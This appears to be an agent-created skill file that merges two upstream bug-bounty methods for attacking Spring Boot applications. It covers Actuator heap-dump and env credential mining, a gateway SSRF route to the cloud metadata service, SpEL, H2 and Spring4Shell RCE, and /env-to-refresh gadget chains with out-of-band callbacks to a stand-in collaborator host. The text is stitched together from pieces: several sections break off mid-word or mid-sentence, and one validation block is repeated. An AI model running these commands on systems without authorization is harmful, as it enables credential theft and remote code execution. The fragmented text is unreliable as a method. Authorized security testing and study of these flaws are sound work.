---
name: bbhunt-springboot
description: "Hunt Actuator exposure, SpEL injection, H2 console RCE, Jolokia and Spring4Shell-class flaws. Unified from 2 upstream skills (cbh, hunting). For authorized security testing only."
agent_created: true
---

# Spring Boot-specific vulnerability hunting — unified methodology

> **Unified skill.** Built from 2 upstream skills across cbh, hunting. Full originals are in `references/upstream-*.md`; the deduplicated union is in `references/unified-method.md`.

## Unified upstream methodology (deduplicated)

### Discovery and hunting method

### A. Discovery checklist — concrete fingerprints, endpoints, headers, CVEs to look for

- **Scale / likelihood (Wiz, Dec 2024):** ~**92,000** internet-facing Spring Boot Actuator endpoints; Actuator appears in ~60% of cloud environments, ~11% have a publicly exposed instance, and **24% of those exposed have a misconfigured instance**. GreyNoise saw ~1K malicious IPs scanning for Actuator in a 30-day window. This is not a rare finding — it is a mass-scanned surface.
- **Default exposure baseline:** since **1.5 (2017)** only `/health` and `/info` are exposed without auth. Anything else (`heapdump`, `env`, `gateway`, `mappings`, `beans`, `configprops`, `threaddump`, `scheduledtasks`, `loggers`, `shutdown`) is a deliberate config change and therefore a real finding when reachable. Wiz measured **2.3%** of exposed Actuators with an unauthenticated `heapdump` and **4%** with unauthenticated `env`.
- **2025–2026 CVEs to map against the version banner:**
  - **CVE-2025-41243** — Spring Cloud Gateway Server Webflux **Spring Environment property modification** via the actuator (F5/HeroDevs: EOL fix available); check `management.endpoint.gateway.enabled` / `access=unrestricted`.
  - **CVE-2025-41253** — SCG Webflux lets an untrusted actor create a route using **SpEL to read environment variables and system properties** when the `gateway` actuator is exposed (`management.endpoints.web.exposure.include=gateway`).
  - **CVE-2026-40976** — Spring Boot **authorization bypass** exposing actuator endpoints; fixed in **Spring Boot 4.0.6**. Verify unauth requests now return 401/403.
  - **CV

### Signals and surfaces

### Crown Jewel Targets

Spring Boot Actuator `/actuator/heapdump` exposed = heap dump with all secrets in memory.

**Highest-value findings:**
- **`/actuator/heapdump`** — full JVM heap dump contains plaintext passwords, tokens, DB credentials, private keys stored anywhere in memory
- **`/actuator/env`** — lists all environment variables and Spring properties including secrets
- **`/actuator/shutdown`** — POST → shuts down the application (Critical availability impact)
- **H2 Console (`/h2-console`)** — in-memory DB admin UI → SQL query execution → potential RCE via `CREATE ALIAS` trick
- **SpEL injection** — Spring Expression Language in template fields, `@Value` annotations, SpEL-processed request params → RCE
- **Spring4Shell CVE-2022-22965** — Spring Framework < 5.3.18 + Tomcat → RCE via data binding

---

### Techniques, payloads and bypasses

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- **Heap-dump credential mining (Wiz commands):**
```
curl 'https://TARGET/actuator/heapdump' -O          # also try bare /heapdump
strings heapdump | grep -B 2 -A 2 "AKIA"            # AWS keys
strings heapdump | grep -B 2 -A 2 "eyJ"             # JWTs
strings heapdump | grep -E "^Host:\s+\S+$" -C 10    # captured cookies / session tokens
```
  For deep analysis use Eclipse MAT (OQL) to find `java.lang.String` instances holding `password`, `secret`, `api_key`, private keys. A heap dump often yields more than `/env` because values are present pre-redaction.
- **Gateway SSRF-by-design (works even on patched versions):** `POST /actuator/gateway/routes/<name>` with a route whose `uri` points at `http://169.254.169.254`, then `POST /actuator/gateway/refresh`, then request the route. With IMDSv1 this returns AWS credentials; **IMDSv2 returns 401** — that 401 is a successful mitigation, not a failed SSRF.
- **CVE-2022-22947 RCE:** the route body's filter `args` are SpEL-injected; the **`/refresh` request is what triggers evaluation**. Use an OOB callback (`curl COLLAB_HOST/gw-rce`) rather than expecting command output. Confirm the route was created by reading `/actuator/gateway/routes` before refresh.
- **Writable `/env` → `/refresh` gadget chain:** POST `{"name":"logging.config","value":"http://COLLAB/logback.xml"}` (Logback JNDI) or `{"name":"eureka.client.serviceUrl.defaultZone","value":"http://COLLAB/x"}` (Eureka XStream deserialization), then POST `/actuator/refresh`. Watch for the callback; a 200 

### Validation and proof

### Validation

✅ Heap dump: strings command extracts readable passwords/tokens from .hprof file
✅ Actuator/env: secrets visible in JSON response
✅ SpEL: arithmetic expression evaluates (7*7=49) or OOB callback received
✅ H2 console: SQL executed, `id` output returned

**Severity:**
- Heapdump with credentials: Critical
- SpEL RCE: Critical
- H2 console RCE: Critical
- Actuator env (passwords exposed): High
- Mappings disclosure only: Low-Medium

---

### C. Validation / proof bar — how to confirm and avoid false positives

- **Do not trust HTTP 200 alone.** Spring returns 200 with a Whitelabel/login page for many actuator paths. Require actuator-shaped JSON (`Content-Type: application/json`, keys like `_links`, `activeProfiles`, `propertySources`) or a genuine HPROF binary (`\x00\x00\x00\x0cJAVA PROFILE` header) before calling an endpoint EXPOSED.
- **Heap dump proof = extracted secrets**, not file size. Show the actual `AKIA...`, JWT, DB password, or captured `Cookie:` line (redacted in the report). A 100MB HPROF with no secrets is an exposure of internal state, not automatically a Critical credential disclosure.
- **Separate CVE from misconfiguration.** `/actuator/heapdump` reachable on a fully patched Spring Boot 3.x/4.x is still a High/Critical misconfiguration; CVE-2025-48927 is specifically the TeleMessage root-level `/heapdump` exploited in the wild. Do not label a generic misconfig as a CVE without a version match.
- **IMDS caveat:** a 401 on the gateway route to `169.254.169.254` means IMDSv2 is enforced — the SSRF primitive may still exist (test an internal service or Collaborator), but "AWS credentials leaked" would be false.
- **SpEL RCE proof:** use an OOB callback on a unique subdomain. `Runtime.exec()` returns a `Process`, not a String, so a bare `exec("id")` produces no reflected output — absence of output is not absence of execution.
- **Auth-bypass regression check (CVE-2026-40976):** re-test every actuator path unauthenticated after a patch is claimed; `/actuator/env` returning **redacted** values is 

### Validation

✅ Heap dump: strings command extracts readable passwords/tokens from .hprof file
✅ Actuator/env: secrets visible in JSON response
✅ SpEL: arithmetic expression evaluates (7*7=49) or OOB callback received
✅ H2 console: SQL executed, `id` output returned

**Severity:**
- Heapdump with credentials: Critical
- SpEL RCE: Critical
- H2 console RCE: Critical
- Actuator env (passwords exposed): High
- Mappings disclosure only: Low-Medium

### Escalation and related chains

### Chain Table

| Spring Boot finding | Chain to | Impact |
|--------------------|----------|--------|
| `/actuator/heapdump` | Extract DB passwords, API keys from memory | Critical credential exfil |
| `/actuator/env` | Read all env vars including secrets | High |
| H2 console accessible | CREATE ALIAS → RCE | Critical |
| SpEL injection | `T(Runtime).exec()` → OS command | Critical RCE |
| Spring4Shell | Write webshell → RCE | Critical |
| Jolokia + MLet | Remote code via MBean | Critical RCE |

---

## Source skills merged into this topic

- `hunting` — `springboot`
- `cbh` — `hunt-springboot`

## References

- `references/unified-method.md` — complete deduplicated union of all upstream sections
- `references/upstream-*.md` — full original SKILL.md from each contributing repo
- `bbhunt-methodology` — orchestrator, state machine and class router
